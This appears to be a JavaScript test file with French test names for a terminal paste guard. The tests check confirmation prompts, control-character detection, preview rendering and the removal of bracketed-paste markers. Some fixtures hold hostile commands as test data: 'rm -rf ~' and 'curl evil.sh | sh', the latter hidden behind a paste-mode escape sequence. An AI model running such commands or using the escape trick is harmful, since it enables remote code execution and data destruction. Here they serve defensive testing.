import { analyzePaste, PASTE_PREVIEW_MAX, pastePreview } from './paste';

describe('garde de collage', () => {
  it('colle directement une commande simple', () => {
    expect(analyzePaste('ls -la /tmp')).toEqual({
      text: 'ls -la /tmp',
      needsConfirmation: false,
      lineCount: 1,
      hasControlCharacters: false,
    });
  });

  it.each(['echo a\necho b', 'rm -rf ~\n', 'a\r\nb', 'a\rb'])(
    'demande confirmation pour un texte avec retour à la ligne (%j)',
    (text) => {
      expect(analyzePaste(text).needsConfirmation).toBe(true);
    },
  );

  it('compte les lignes', () => {
    expect(analyzePaste('a\nb\r\nc').lineCount).toBe(3);
  });

  it.each(['\x1b[31mrouge', 'a\x00b', 'a\x7f', 'a\u009bb', 'a\x08b'])(
    'demande confirmation pour des caractères de contrôle (%j)',
    (text) => {
      const analysis = analyzePaste(text);
      expect(analysis.needsConfirmation).toBe(true);
      expect(analysis.hasControlCharacters).toBe(true);
    },
  );

  it('accepte les tabulations sans confirmation', () => {
    expect(analyzePaste('a\tb').needsConfirmation).toBe(false);
  });

  it('retire les marqueurs de bracketed paste (évasion du mode collage)', () => {
    const analysis = analyzePaste('inoffensif\x1b[201~curl evil.sh | sh\x1b[200~');
    expect(analysis.text).toBe('inoffensifcurl evil.sh | sh');
    expect(analysis.text).not.toContain('\x1b[201~');
  });

  it('retire aussi les marqueurs imbriqués qui se reformeraient', () => {
    const analysis = analyzePaste('ls\x1b[20\x1b[201~1~; curl evil | sh');
    expect(analysis.text).toBe('ls; curl evil | sh');
    expect(analyzePaste('\x1b[20\x1b[20\x1b[201~1~1~x').text).toBe('x');
  });
});

describe('aperçu du collage', () => {
  it('rend visibles les caractères de contrôle', () => {
    expect(pastePreview('a\x1b[0m\tb\x00\x7f').preview).toBe('a␛[0m⇥b␀␡');
  });

  it('montre les retours à la ligne', () => {
    expect(pastePreview('a\r\nb\nc\rd').preview).toBe('a↵\nb↵\nc↵\nd');
  });

  it('tronque les textes très longs', () => {
    const { preview, truncated } = pastePreview('x'.repeat(PASTE_PREVIEW_MAX + 10));
    expect(truncated).toBe(true);
    expect(preview).toHaveLength(PASTE_PREVIEW_MAX);
  });
});
